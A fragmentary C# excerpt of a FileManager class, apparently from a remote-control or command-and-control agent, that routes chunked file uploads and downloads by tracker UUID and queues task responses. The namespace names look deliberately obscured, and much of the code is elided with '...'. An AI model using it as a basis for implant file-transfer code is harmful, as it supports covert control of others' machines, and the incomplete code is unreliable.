...
using YXBqSVSFInterop.Classes.Events;
...
using YXBqSVSFInterop.Classes.Cryptography;
using EncryptedFileStore;

namespace YXBqSVSF.Management.Files
{
    public sealed class FileManager : IFileManager
    {
        ...
        {
            if (_uploadMessageStore.ContainsKey(resp.YXBqSVSFTrackerUUID))
            {
                // This is an upload message response, send it along.
                if (resp.ChunkNumber > 0 && _uploadMessageStore.ContainsKey(resp.YXBqSVSFTrackerUUID))
                {
                    _uploadMessageStore[resp.YXBqSVSFTrackerUUID].MessageStore.AddMessage(resp);
                }
            } else
            {
                if (_downloadMessageStore.ContainsKey(resp.YXBqSVSFTrackerUUID))
                {
                    _downloadMessageStore[resp.YXBqSVSFTrackerUUID].AddMessage(resp);
                }
            }
        }
        ...
        private void FileManager_MessageComplete(object sender, ChunkMessageEventArgs<TaskStatus> e)
        {
            ...
            if (_uploadMessageStore.TryGetValue(e.Chunks[0].YXBqSVSFTrackerUUID, out UploadMessageTracker tracker))
            {
                tracker.Data = data.ToArray();
                _uploadMessageStore[e.Chunks[0].YXBqSVSFTrackerUUID] = tracker;
        ...
        private void MessageStore_ChunkAdd(object sender, ChunkMessageEventArgs<TaskStatus> e)
        {
            ...
            _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse()
            {
                ...
                YXBqSVSFTrackerUUID = msg.YXBqSVSFTrackerUUID
            });
        }
        ...
        private void DownloadChunkSent(object sender, ChunkMessageEventArgs<TaskStatus> e)
        {
            ...
            _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse()
            {
                ...
                YXBqSVSFTrackerUUID = e.Chunks[0].YXBqSVSFTrackerUUID
            });
        }
